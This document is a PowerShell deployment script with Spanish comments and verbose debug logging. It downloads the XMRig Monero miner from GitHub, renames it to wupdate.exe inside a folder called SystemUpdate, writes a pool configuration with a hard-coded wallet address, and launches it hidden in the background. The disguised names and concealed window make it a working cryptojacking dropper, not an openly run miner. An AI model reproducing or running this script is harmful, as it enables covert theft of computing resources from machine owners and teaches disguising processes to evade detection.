# === DEPLOY XMRig DEBUG VERSION (con logs detallados) ===
$installPath = "C:\ProgramData\SystemUpdate"
$debugLog = "$installPath\deploy-debug.log"
$minerLog = "$installPath\miner-output.log"

# Función para loguear todo
function Write-DebugLog {
    param([string]$message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp | $message" | Add-Content -Path $debugLog -Encoding UTF8 -Force
    Write-Host "$timestamp | $message"   # También sale en consola si no está oculta
}

Write-DebugLog "=== INICIO DEPLOY DEBUG ==="
Write-DebugLog "Usuario: $(whoami)"
Write-DebugLog "Directorio actual: $(Get-Location)"

# 1. Crear carpeta
New-Item -ItemType Directory -Path $installPath -Force | Out-Null
Write-DebugLog "Carpeta creada: $installPath"

# 2. Descarga y extracción
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$zipPath = "$installPath\xmrig.zip"
Write-DebugLog "Descargando XMRig desde $zipUrl..."
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
Write-DebugLog "Descarga OK. Tamaño: $((Get-Item $zipPath).Length) bytes"

Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
Write-DebugLog "Extracción OK"

# 3. Copiar ejecutable
Copy-Item "$installPath\xmrig-6.25.0\xmrig.exe" "$installPath\wupdate.exe" -Force
Write-DebugLog "wupdate.exe creado"

# 4. Configuración limpia (sin BOM)
$config = @{
    autosave = $true
    cpu = @{ "max-threads-hint" = 50 }
    pools = @(@{ url = "pool.supportxmr.com:3333"; user = "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd"; pass = "x"; keepalive = $true; tls = $false })
    background = $false
    "log-file" = $null
}
$configPath = "$installPath\config.json"
$config | ConvertTo-Json -Depth 10 | Set-Content -Path $configPath -Encoding UTF8NoBOM -Force
Write-DebugLog "config.json creado (sin BOM)"

# TEST: ¿existe el config?
if (Test-Path $configPath) {
    Write-DebugLog "TEST OK: config.json existe"
    $content = Get-Content $configPath -Raw -First 5
    Write-DebugLog "Primeras líneas del config: $($content -replace "`n"," | ")"
} else {
    Write-DebugLog "ERROR CRÍTICO: config.json NO existe"
}

# 5. Lanzamiento con DEBUG (directorio correcto + logs)
$exePath = "$installPath\wupdate.exe"
Write-DebugLog "Lanzando minero con WorkingDirectory + -B..."

Start-Process -FilePath $exePath `
    -WorkingDirectory $installPath `
    -ArgumentList "-B -c config.json --log-file `"$minerLog`"" `
    -WindowStyle Hidden `
    -NoNewWindow

Write-DebugLog "Start-Process ejecutado (PID del proceso padre: $PID)"

# Espera 8 segundos y comprueba proceso
Start-Sleep -Seconds 8
$process = Get-Process wupdate -ErrorAction SilentlyContinue
if ($process) {
    Write-DebugLog "ÉXITO: wupdate.exe está corriendo (PID: $($process.Id)) - Uso CPU: $($process.CPU)"
} else {
    Write-DebugLog "ERROR: No se detecta wupdate.exe después de 8 segundos"
}

Write-DebugLog "=== FIN DEPLOY DEBUG ==="
Write-DebugLog "Revisa los archivos: deploy-debug.log y miner-output.log en C:\ProgramData\SystemUpdate"

Write-Output "=== DEPLOY DEBUG TERMINADO - Revisa los logs para ver qué falló ==="
